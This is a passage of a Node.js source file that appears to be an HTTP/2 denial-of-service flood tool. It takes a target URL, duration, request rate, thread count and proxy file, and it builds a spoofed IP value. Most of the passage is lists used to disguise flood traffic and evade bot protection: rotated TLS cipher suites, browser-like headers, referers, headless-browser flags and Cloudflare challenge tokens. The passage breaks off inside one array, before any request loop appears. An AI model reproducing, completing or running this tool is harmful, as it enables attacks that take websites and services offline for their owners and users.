 const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const colors = require('colors');
 const axios = require('axios');
 const https = require('https');

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log('node repz.js (url) (time) (req) (threads) (proxy)'); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }
 const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 
 const pathts = [
    "/",
    "?page=1",
    "?page=2",
    "?page=3",
    "?category=news",
    "?category=sports",
    "?category=technology",
    "?category=entertainment", 
    "?sort=newest",
    "?filter=popular",
    "?limit=10",
    "?start_date=1989-06-04",
    "?end_date=1989-06-04",
  ];

const cplist = [
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH'
    ];
    
 const accept_header = [
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    '*/*',
    'image/*',
    'image/webp,image/apng',
    'text/html',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
    'Connection: keep-alive',
    'Referer: https://www.example.com',
    'Upgrade-Insecure-Requests: 1',
    'DNT: 1',
    'Accept-Encoding: gzip, deflate, br',
    'Cache-Control: max-age=0',
    'Host: www.example.com',
    'Origin: https://www.example.com',
    'Content-Type: application/x-www-form-urlencoded',
    'Content-Length: 42',
    'Cookie: session_id=abc123; user_id=12345',
    'If-None-Match: "686897696a7c876b7e"',
    'X-Requested-With: XMLHttpRequest',
    'X-Forwarded-For: 192.168.1.1',
    'CF-Challenge: captcha-challenge-header',
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel",
 ]; 
 const lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
 "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
 "en-US,en;q=0.5", "en-US,en;q=0.9",
 "de-CH;q=0.7",
 "da, en-gb;q=0.8, en;q=0.7",
 "cs;q=0.5",
 'en-US,en;q=0.9',
 'en-GB,en;q=0.9',
 'en-CA,en;q=0.9',
 'en-AU,en;q=0.9',
 'en-NZ,en;q=0.9',
 'en-ZA,en;q=0.9',
 'en-IE,en;q=0.9',
 'en-IN,en;q=0.9',
 'ar-SA,ar;q=0.9',
 'az-Latn-AZ,az;q=0.9',
 'be-BY,be;q=0.9',
 'bg-BG,bg;q=0.9',
 'bn-IN,bn;q=0.9',
 'ca-ES,ca;q=0.9',
 'cs-CZ,cs;q=0.9',
 'cy-GB,cy;q=0.9',
 'da-DK,da;q=0.9',
 'de-DE,de;q=0.9',
 'el-GR,el;q=0.9',
 'es-ES,es;q=0.9',
 'et-EE,et;q=0.9',
 'eu-ES,eu;q=0.9',
 'fa-IR,fa;q=0.9',
 'fi-FI,fi;q=0.9',
 'fr-FR,fr;q=0.9',
 'ga-IE,ga;q=0.9',
 'gl-ES,gl;q=0.9',
 'gu-IN,gu;q=0.9',
 'he-IL,he;q=0.9',
 'hi-IN,hi;q=0.9',
 'hr-HR,hr;q=0.9',
 'hu-HU,hu;q=0.9',
 'hy-AM,hy;q=0.9',
 'id-ID,id;q=0.9',
 'is-IS,is;q=0.9',
 'it-IT,it;q=0.9',
 'ja-JP,ja;q=0.9',
 'ka-GE,ka;q=0.9',
 'kk-KZ,kk;q=0.9',
 'km-KH,km;q=0.9',
 'kn-IN,kn;q=0.9',
 'ko-KR,ko;q=0.9',
 'ky-KG,ky;q=0.9',
 'lo-LA,lo;q=0.9',
 'lt-LT,lt;q=0.9',
 'lv-LV,lv;q=0.9',
 'mk-MK,mk;q=0.9',
 'ml-IN,ml;q=0.9',
 'mn-MN,mn;q=0.9',
 'mr-IN,mr;q=0.9',
 'ms-MY,ms;q=0.9',
 'mt-MT,mt;q=0.9',
 'my-MM,my;q=0.9',
 'nb-NO,nb;q=0.9',
 'ne-NP,ne;q=0.9',
 'nl-NL,nl;q=0.9',
 'nn-NO,nn;q=0.9',
 'or-IN,or;q=0.9',
 'pa-IN,pa;q=0.9',
 'pl-PL,pl;q=0.9',
 'pt-BR,pt;q=0.9',
 'pt-PT,pt;q=0.9',
 'ro-RO,ro;q=0.9',
 'ru-RU,ru;q=0.9',
 'si-LK,si;q=0.9',
 'sk-SK,sk;q=0.9',
 'sl-SI,sl;q=0.9',
 'sq-AL,sq;q=0.9',
 'sr-Cyrl-RS,sr;q=0.9',
 'sr-Latn-RS,sr;q=0.9',
 'sv-SE,sv;q=0.9',
 'sw-KE,sw;q=0.9',
 'ta-IN,ta;q=0.9',
 'te-IN,te;q=0.9',
 'th-TH,th;q=0.9',
 'tr-TR,tr;q=0.9',
 'uk-UA,uk;q=0.9',
 'ur-PK,ur;q=0.9'
];
 
 const encoding_header = [
    'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
 ];
 
 const control_header = [
    'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
  'must-understand, no-store',
  'max-age=31536000; includeSubDomains',
  'max-age=31536000; includeSubDomains; preload',
  'max-age=120',
  'max-age=0,no-cache,no-store,must-revalidate',
  'public, max-age=604800, immutable',
  'max-age=0, must-revalidate, private',
  'max-age=0, private, must-revalidate',
  'max-age=604800, stale-while-revalidate=86400',
  'max-stale=3600',
  'public, max-age=2678400',
  'min-fresh=600',
  'public, max-age=30672000',
  'max-age=31536000, immutable',
  'max-age=604800, stale-if-error=86400',
  'public, max-age=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
  'public, s-maxage=600, max-age=60'
 ];
 
 const refers = [
  'https://www.google.com',
  'https://www.facebook.com',
  'https://www.twitter.com',
  'https://www.youtube.com',
  'https://www.amazon.com',
  'https://www.netflix.com',
  'https://www.instagram.com',
  'https://www.yahoo.com',
  'https://www.stackoverflow.com',
  'https://www.github.com',
  'https://www.linkedin.com',
  'https://www.cnn.com',
  'https://www.apple.com',
  'https://www.microsoft.com',
  'https://www.wikipedia.org',
  'https://www.nytimes.com',
  'https://www.msn.com',
  'https://www.reddit.com',
  'https://www.quora.com',
  'https://www.npr.org',
  'https://www.bbc.com',
  'https://www.theguardian.com',
  'https://www.huffingtonpost.com',
  'https://www.washingtonpost.com',
  'https://www.wsj.com',
  'https://www.bloomberg.com',
  'https://www.cnbc.com',
  'https://www.merriam-webster.com',
  'https://www.dictionary.com',
  'https://www.thedailybeast.com',
  'https://www.thedailyshow.com',
  'https://www.colbertnation.com',
  'https://www.nationalgeographic.com',
  'https://www.nasa.gov',
  'https://www.nypl.org',
  'https://www.britannica.com',
  'https://www.healthline.com',
  'https://www.webmd.com',
  'https://www.mayoclinic.org',
  'https://www.cdc.gov',
  'https://www.nih.gov',
  'https://www.medlineplus.gov',
  'https://www.cancer.gov',
  'https://www.fda.gov',
  'https://www.nature.com',
  'https://www.sciencemag.org',
  'https://www.scientificamerican.com',
  'https://www.who.int',
  'https://www.un.org',
  'https://www.worldbank.org',
  'https://www.imf.org',
  'https://www.wto.org',
  'https://www.oecd.org',
  'https://www.europa.eu',
  'https://www.nato.int',
  'https://www.icrc.org',
  'https://www.amnesty.org',
  'https://www.hrw.org',
  'https://www.greenpeace.org',
  'https://www.oxfam.org',
  'https://www.doctorswithoutborders.org',
  'https://www.unicef.org',
  'https://www.savethechildren.org',
  'https://www.redcross.org',
  'https://www.wikipedia.org',
  'https://www.wikimedia.org',
  'https://www.mozilla.org',
  'https://www.apache.org',
  'https://www.mysql.com',
  'https://www.php.net',
  'https://www.python.org',
  'https://www.ruby-lang.org',
  'https://www.jquery.com',
  'https://www.reactjs.org',
  'https://www.angularjs.org',
  'https://www.vuejs.org',
  'https://www.bootstrap.com',
  'https://www.materializecss.com',
  'https://www.sass-lang.com',
  'https://www.lesscss.org',
  'https://www.d3js.org',
  'https://www.highcharts.com',
  'https://www.chartjs.org',
  'https://www.mapbox.com',
  'https://www.mapboxgl-js.com',
  'https://www.openstreetmap.org',
  'https://www.mapbox.com',
  'https://www.mapboxgl-js.com',
  'https://www.chartjs.org',
  'https://www.highcharts.com',
  'https://www.d3js.org',
  'https://www.lesscss.org',
  'https://www.sass-lang.com',
  'https://www.materializecss.com',
  'https://www.bootstrap.com',
  'https://www.vuejs.org',
  'https://www.angularjs.org',
  'https://www.reactjs.org',
  'https://www.jquery.com',
  'https://www.ruby-lang.org',
  'https://www.python.org',
  'https://www.php.net',
  'https://www.mysql.com',
  'https://www.apache.org',
  'https://www.mozilla.org',
  'https://www.wikimedia.org',
  'https://www.wikipedia.org',
  'https://www.redcross.org',
  'https://www.savethechildren.org',
  'https://www.unicef.org',
  'https://www.doctorswithoutborders.org',
  'https://www.oxfam.org',
  'https://www.greenpeace.org',
  'https://www.hrw.org',
  'https://www.amnesty.org',
  'https://www.icrc.org',
  'https://www.nato.int',
  'https://www.europa.eu',
  'https://www.oecd.org',
  'https://www.wto.org',
  'https://www.imf.org',
  'https://www.worldbank.org',
  'https://www.un.org',
  'https://www.who.int',
  'https://www.scientificamerican.com',
  'https://www.sciencemag.org',
  'https://www.nature.com',
  'https://www.fda.gov',
  'https://www.cancer.gov',
  'https://www.medlineplus.gov',
  'https://www.nih.gov',
  'https://www.cdc.gov',
  'https://www.mayoclinic.org',
  'https://www.webmd.com',
  'https://www.healthline.com',
  'https://www.britannica.com',
  'https://www.nypl.org',
  'https://www.nasa.gov',
  'https://www.nationalgeographic.com',
  'https://www.colbertnation.com',
  'https://www.thedailyshow.com',
  'https://www.thedailybeast.com',
  'https://www.dictionary.com',
  'https://www.merriam-webster.com',
  'https://www.cnbc.com',
  'https://www.bloomberg.com',
  'https://www.wsj.com',
  'https://www.washingtonpost.com',
  'https://www.huffingtonpost.com',
  'https://www.theguardian.com',
  'https://www.bbc.com',
  'https://www.npr.org',
  'https://www.quora.com',
  'https://www.reddit.com',
  'https://www.msn.com',
  'https://www.nytimes.com',
  'https://www.wikipedia.org',
  'https://www.microsoft.com',
  'https://www.apple.com',
  'https://www.cnn.com',
  'https://www.linkedin.com',
  'https://www.github.com',
  'https://www.stackoverflow.com',
  'https://www.yahoo.com',
  'https://www.instagram.com',
  'https://www.netflix.com',
  'https://www.amazon.com',
  'https://www.youtube.com',
  'https://www.twitter.com',
  'https://www.facebook.com',
  'https://www.google.com'
];

 const cookie1 = [
    "--no-sandbox",
    "--disable-setuid-sandbox",
    "--disable-infobars",
    "--disable-logging",
    "--disable-login-animations",
    "--disable-notifications",
    "--disable-gpu",
    "--headless",
    "--lang=ko_KR",
    "--start-maxmized",
    "--ignore-certificate-errors",
    "--hide-scrollbars",
    "--mute-audio",
    "--disable-web-security",
    "--incognito",
    "--disable-canvas-aa",
    "--disable-2d-canvas-clip-aa",
    "--disable-accelerated-2d-canvas",
    "--no-zygote",
    "--use-gl=desktop",
    "--disable-gl-drawing-for-tests",
    "--disable-dev-shm-usage",
    "--no-first-run",
    "--disable-features=IsolateOrigins,site-per-process",
    "--ignore-certificate-errors-spki-list",
    "--user-agent=Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
    "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
    "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
